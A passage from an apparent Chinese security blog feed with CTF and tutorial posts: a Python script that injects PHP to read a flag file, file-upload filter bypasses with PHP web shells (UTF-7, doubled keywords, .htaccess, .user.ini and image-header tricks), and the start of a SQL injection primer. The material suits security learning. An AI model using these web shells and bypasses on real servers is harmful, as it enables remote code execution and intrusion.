class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#url = &quot;http://127.0.0.1/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open (<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">line = line.strip()</span><br><span class="line">r = requests.get(url+line)</span><br><span class="line"><span class="comment">#print(r)</span></span><br><span class="line"><span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">print(<span class="string">&quot;url:&quot;</span>+r.url)</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/7.png"></p><h3 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h3><p>有了以上知识，可以开始编写脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests  #导入requests模块</span><br><span class="line">import re        #导入re模块</span><br><span class="line">r &#x3D; requests.session();   </span><br><span class="line">result&#x3D;r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28054&quot;)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/8.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以得到在&lt;h4&gt;里面就是我们需要利用的内容</span><br><span class="line"></span><br><span class="line">写一个正则匹配&lt;h4&gt;</span><br><span class="line">&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.findall  的简单用法（返回string中所有与pattern相匹配的全部字串，返回形式为数组）</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/9.png"></p><p><strong>url拼接</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests  #导入requests模块</span><br><span class="line">import re        #导入re模块</span><br><span class="line">r &#x3D; requests.session();   </span><br><span class="line">result&#x3D;r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28054&quot;)</span><br><span class="line">expr&#x3D;re.findall(&quot;&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;&quot;,result.text)</span><br><span class="line">print(eval(expr[0]))</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;47.98.234.232:28054?a&#x3D;%s&quot;%str(eval(expr[0]))+&quot; and print_r(readfile(&#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&#39;))&quot;</span><br><span class="line">print(url)</span><br><span class="line">a&#x3D;r.get(url)</span><br><span class="line">if &quot;Try again!&quot; not in a.text:</span><br><span class="line">print(&quot;yes&quot;)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/10.png"></p><p><strong>到这里发现不用返回那么多级目录，在文件名前面加一个/就可以了！！！</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;47.98.234.232:28054?a&#x3D;%s&quot;%str(eval(expr[0]))+&quot; and print_r(file_get_contents(&#39;&#x2F;flag&#39;))&quot;</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/11.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/12.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://www.yoyo2tong.xyz/2020/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.yoyo2tong.xyz/2020/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-10-31T07:27:43.834Z</published>
    <updated>2020-10-31T07:32:50.307Z</updated>
    
    <content type="html"><![CDATA[<h3 id="文件上传漏洞原因"><a href="#文件上传漏洞原因" class="headerlink" title="文件上传漏洞原因"></a>文件上传漏洞原因</h3><p>一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。</p><p>通常造成文件上传漏洞的原因是对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。</p><h4 id="本地文件上传"><a href="#本地文件上传" class="headerlink" title="本地文件上传"></a>本地文件上传</h4><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDCCPDCDFDCCOHAGOGH"></p><p>本地文件上传只有当选择的php版本不带有nts才能成功执行。</p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDDCPDCDFDDCOHAGOGH"></p><p>当成功执行phpinfo（）后，可以用蚁剑连接，可获得后台的内容。</p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDFCPDCDFDECOHAGOGH"></p><h3 id="文件上传漏洞的绕过方法"><a href="#文件上传漏洞的绕过方法" class="headerlink" title="文件上传漏洞的绕过方法"></a>文件上传漏洞的绕过方法</h3><h4 id="htaccess任意文件执行"><a href="#htaccess任意文件执行" class="headerlink" title="htaccess任意文件执行"></a>htaccess任意文件执行</h4><p>可以将后缀名不是为php的文件改为后缀名为php的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa   &#x2F;&#x2F;将后缀名为aaa的文件均改为后缀名为php文件</span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg   &#x2F;&#x2F;将后缀名为jpg的文件均改为后缀名为php文件</span><br></pre></td></tr></table></figure><p>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\</span><br><span class="line">cation&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><p>需要在换行的地方加上一个(反斜杠)</p><h4 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h4><ul><li>JS风格</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>短标签风格</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;?=?&gt;</code>与<code>&lt;?php echo ....?&gt;</code>等效</li><li>ASP风格</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% phpinfo();%&gt;</span><br></pre></td></tr></table></figure><ul><li>官方默认风格</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h4><p>如果程序过滤了所有标签形式、或者说过滤了<code>&lt;?</code>而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下<code>&lt;?php</code>形式），这时候我们可以用utf-7编码一句话木马，并通过.htaccess文件解码。</p><p><strong>.htaccess</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;  &#x2F;&#x2F; 对文件后缀名为aaa的文件内容进行UTF-7解码</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-</span><br><span class="line">&#x2F;&#x2F; &lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>假如对上传文件的内容中的php，POST，eval替换为空，那么我们可以用这样的方式绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?pphphp</span><br><span class="line">@eevalval($_PPOSTOST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><h4 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h4><p>.htaccess是伪静态环境配置文件，用于lamp。<br>.user.ini是lnmp文件，里面放的是你网站的文件夹路径地址。目的是防止跨目录访问和文件跨目录读取.<br>配置 放在根目录 .user.ini</p><ul><li>如果上传目录下有一个php文件，可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行</li><li>.user.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.aaa</span><br></pre></td></tr></table></figure><p>1.aaa</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p>在加载其他文件的时候，会先加载.user.ini里面的1.aaa</p><p>当.htaccess被禁止上传时，可以使用.htaccess代替.user.ini</p><h4 id="文件包含解码Base64"><a href="#文件包含解码Base64" class="headerlink" title="文件包含解码Base64"></a>文件包含解码Base64</h4><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.aaa&quot;</span><br></pre></td></tr></table></figure><h4 id="图片头绕过"><a href="#图片头绕过" class="headerlink" title="图片头绕过"></a>图片头绕过</h4><p><strong>XMB文件头绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br></pre></td></tr></table></figure><p>放在php文件的开头，让getimagesize函数误以为上传的是图片文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>GIF89a</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure><p>也是放在php文件的开头，来绕过getimagesize函数。</p><h4 id="动态拼接函数绕过函数过滤"><a href="#动态拼接函数绕过函数过滤" class="headerlink" title="动态拼接函数绕过函数过滤"></a>动态拼接函数绕过函数过滤</h4><p>当源程序对危险函数进行了过滤，可以使用aiisc码拼接动态构造函数来绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = chr(<span class="number">112</span>).chr(<span class="number">104</span>).chr(<span class="number">112</span>).chr(<span class="number">105</span>).chr(<span class="number">110</span>).chr(<span class="number">102</span>).chr(<span class="number">111</span>);</span><br><span class="line">$a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>使用如下代码快速生成指定函数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;chr(&quot;</span>.ord($a[$i]).<span class="string">&quot;).&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于php不允许eval动态拼接，所以我们不能拼接一句话木马。</p><p>但我们可以构造system函数来执行系统命令获得flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);</span><br><span class="line">$a(cat&#x2F;flag);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="使用ctf-wscan查看是否存在备份文件"><a href="#使用ctf-wscan查看是否存在备份文件" class="headerlink" title="使用ctf-wscan查看是否存在备份文件"></a>使用ctf-wscan查看是否存在备份文件</h3><p><strong>ctf-wscan下载地址</strong> </p><p><a href="https://codeload.github.com/kingkaki/ctf-wscan/zip/master">https://codeload.github.com/kingkaki/ctf-wscan/zip/master</a></p><h4 id="安装python3的环境"><a href="#安装python3的环境" class="headerlink" title="安装python3的环境"></a>安装python3的环境</h4><p>（ctf-wscan只能在python3环境下使用）</p><p><strong>1，下载地址</strong></p><p><a href="https://www.python.org/ftp/python/3.8.3/python-3.8.3-amd64.exe">https://www.python.org/ftp/python/3.8.3/python-3.8.3-amd64.exe</a></p><p><strong>2，安装</strong></p><p>安装之后的界面</p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDGCPDCDEDHCOHAGOGH"></p><p>如果安装之后的界面是这样，则没有点击创建文档文件。</p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDECPDFDFDFCOHAGOGH"></p><h4 id="下载requests请求插件"><a href="#下载requests请求插件" class="headerlink" title="下载requests请求插件"></a>下载requests请求插件</h4><p>1，下载requests插件需要在python3的Scripts文件下下载</p><p>输入命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDHCPDCDEDICOHAGOGH"></p><p>提示命令加上–user 和更新pip</p><p>2，根据提示，输入 python -m pip install –upgrade pip,依然显示错误</p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDHDACPDGDHDGDICOHAGOGH"></p><p>3，输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -upgrade pip -i http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple --user</span><br></pre></td></tr></table></figure><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDICPDCDEDJCOHAGOGH"></p><p>成功更新。</p><p>4，下载requests插件成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests --user</span><br></pre></td></tr></table></figure><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDJCPDCDFDACOHAGOGH"></p><h4 id="使用ctf-wsacn扫描文件"><a href="#使用ctf-wsacn扫描文件" class="headerlink" title="使用ctf-wsacn扫描文件"></a>使用ctf-wsacn扫描文件</h4><p>输入 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ctf-wscan.py 网址</span><br></pre></td></tr></table></figure><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDHDBCPDCDFDBCOHAGOGH"></p><p>例，可以看出存在index.php.py备份文件。</p><p>下载备份文件</p><ul><li>把<code>.index.php.swp</code>放到linux下使用vim -r恢复</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure><ul><li>得到源码</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;文件上传漏洞原因&quot;&gt;&lt;a href=&quot;#文件上传漏洞原因&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞原因&quot;&gt;&lt;/a&gt;文件上传漏洞原因&lt;/h3&gt;&lt;p&gt;一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SQL 注入基础</title>
    <link href="http://www.yoyo2tong.xyz/2020/10/30/SQL-%E6%B3%A8%E5%85%A5/"/>
    <id>http://www.yoyo2tong.xyz/2020/10/30/SQL-%E6%B3%A8%E5%85%A5/</id>
    <published>2020-10-30T09:44:41.518Z</published>
    <updated>2020-10-31T07:21:24.654Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p><p><strong>SQL注入漏洞的产生需要满足的条件：</strong></p><p>1，参数用户可控：前端传给后端的参数内容是用户可以控制的。</p><p>2，参数带入数据库查询时：传入参数拼接到SQL语句，且带入数据库查询。</p><h3 id="与MySQL注入的相关知识点"><a href="#与MySQL注入的相关知识点" class="headerlink" title="与MySQL注入的相关知识点"></a>与MySQL注入的相关知识点</h3><h4 id="mysql介绍"><a href="#mysql介绍" class="headerlink" title="mysql介绍"></a>mysql介绍</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql 中 库，表，数据三者的关系  </span><br><span class="line"></span><br><span class="line">表：    在数据库中，表（table）类似于excel，用来存放数据，表中有字段，不同的字段有不同的数据类型。</span><br><span class="line"></span><br><span class="line">​   字段：类似excel表头</span><br><span class="line"></span><br><span class="line">数据： 有不同的存在形式：文本视频，图片，音频，文本等</span><br><span class="line"></span><br><span class="line">​ 数据类型：字符串（var）（varchar）  整数（int，bright）小数（float） 日期（date）等</span><br><span class="line"></span><br><span class="line">库：    用来存放表的，可以存放n张表</span><br></pre></td></tr></table></figure><h4 id="增删检改"><a href="#增删检改" class="headerlink" title="增删检改"></a>增删检改</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">创建一个数据库  CREATE DATABASE 库名；</span><br><span class="line">删除数据库    DROP DATABASE 库名；</span><br><span class="line">在创建库时，指定编码  create database 库名 character set 编码名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">创建表（table）    create table 表名（字段1 数据类型，字段2，数据类型）</span><br><span class="line">例：create table 成绩表（ 姓名 varchar（40），班级 varchar（20）， 成绩表 float   ）；</span><br><span class="line">删除表 DROP table 表名；</span><br></pre></td></tr></table></figure><p><strong>往指定的表中添加数据：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名（字段1，字段2，......)  values(值1，值2....)</span><br><span class="line"></span><br><span class="line">insert into &#96;成绩表&#96;(姓名，班级，成绩)values（&#96;老王&#96; ,&#96;dt55&#96;,90.5)</span><br><span class="line"></span><br><span class="line">insert into 成绩表（姓名）values（老王）；</span><br></pre></td></tr></table></figure><p><strong>第二种语法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名 set 字段名1&#x3D;自动值1，字段名2&#x3D;字段值2...</span><br><span class="line"></span><br><span class="line">insert into &#96;成绩表&#96; SET   姓名&#x3D;&#96;李四&#96;;</span><br><span class="line"></span><br><span class="line">删除数据语法：delete from 表名 where 条件</span><br><span class="line"></span><br><span class="line">delete from &#96;成绩表&#96; where 姓名&#x3D;&#96;李四&#96;;</span><br></pre></td></tr></table></figure><h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql注释符</span><br><span class="line"></span><br><span class="line">1、#...</span><br><span class="line"></span><br><span class="line">2、&quot;-- ...&quot;  相当于--+</span><br><span class="line"></span><br><span class="line">3、&#x2F;*...*&#x2F;</span><br><span class="line"></span><br><span class="line">4,内联注释：只有Mysql可以识别，常用来绕过WAF</span><br><span class="line">内联注释可以被执行&#x2F;*!  *&#x2F; 内联注释可以用于整个SQL语句中，用来执行我们的SQL语句</span><br><span class="line">例：?id&#x3D;1 &#x2F;*!union*&#x2F; &#x2F;*!SELECT*&#x2F; 1,2,3</span><br></pre></td></tr></table></figure><h4 id="MySQL总表"><a href="#MySQL总表" class="headerlink" title="MySQL总表"></a>MySQL总表</h4><p>在Mysql5.0版本之后，MySQL默认在数据库中存放一个“information——schema”的数据库，mysql数据库的所有内容都在这个库里，需要记住三个表名，分别为SCHEMATA，该表存放用户建立的所有数据库的哭名。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/%E6%80%BB%E8%A1%A8.png"></p><p>TABLES表存储用户创建的所有数据库的库名和表名。</p><p>COLUMNS表存储用户创建的所有数据库的额库名，表名和字段名。</p><h4 id="MySQL查询语句"><a href="#MySQL查询语句" class="headerlink" title="MySQL查询语句"></a>MySQL查询语句</h4><p><strong>在不知道任何条件下，可用：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 要查询的字段名 from 库名.表名</span><br><span class="line">&#x2F;&#x2F;数据库.表名 可以查询指定数据库的指定表</span><br></pre></td></tr></table></figure><p><strong>在知道一条已知条件下，可有：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 要查询的字段名 from 库名.表名 where 已知条件的字段名&#x3D;‘已知条件的值’</span><br></pre></td></tr></table></figure><p><strong>在知道两条已知条件时，可用：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 要查询的字段名 from 库名.表名 where 已知条件1的字段名&#x3D;‘已知条件1的值’ AND  已知条件2的字段名&#x3D;‘已知条件2的值’</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/%E6%9F%A5%E8%AF%A2%E6%80%BB%E8%A1%A8.png" alt="查询总表"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5.png" alt="查询字段"></p><h4 id="limit的用法"><a href="#limit的用法" class="headerlink" title="limit的用法"></a>limit的用法</h4><p>limit的使用格式为limitm,n，其中m是指记录开始的位置，n是指取几条记录。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/limit%E6%9F%A5%E8%AF%A2.png" alt="limit查询"></p><h4 id="sql函数"><a href="#sql函数" class="headerlink" title="sql函数"></a>sql函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AIISC函数     ascii（）#括号中的参数转化成相应的ascii码</span><br><span class="line">​          例：select ascii(&#39;a&#39;)#输出结果为97</span><br><span class="line"></span><br><span class="line">substr函数      substr（a,b,c)   从b位置开始，截取字符串a的c函数</span><br><span class="line">​            select assii(&#39;cxk&#39;,1,1) 返回c</span><br><span class="line"></span><br><span class="line">sleep函数       sleep（5） 休眠5秒</span><br><span class="line">​               and if (1&lt;2,sleep(5),0)--+</span><br><span class="line">​          从语句可以知道如果给第一个select执行成功，那么将会执行sleep（5）进行五秒的休眠</span><br></pre></td></tr></table></figure><h3 id="Union注入攻击"><a href="#Union注入攻击" class="headerlink" title="Union注入攻击"></a>Union注入攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$server &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">$username &#x3D; &quot;root&quot;;</span><br><span class="line">$passwd &#x3D; &quot;root&quot;;</span><br><span class="line">$dbname &#x3D; &quot;xiaoming&quot;;</span><br><span class="line">$conn &#x3D; new mysqli($server,$username,$passwd,$dbname);</span><br><span class="line">if ($conn-&gt;connect_error&lt;&gt;0)&#123;</span><br><span class="line">die(&quot;Error&quot;.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$data &#x3D; $conn-&gt;query(&quot;select * from 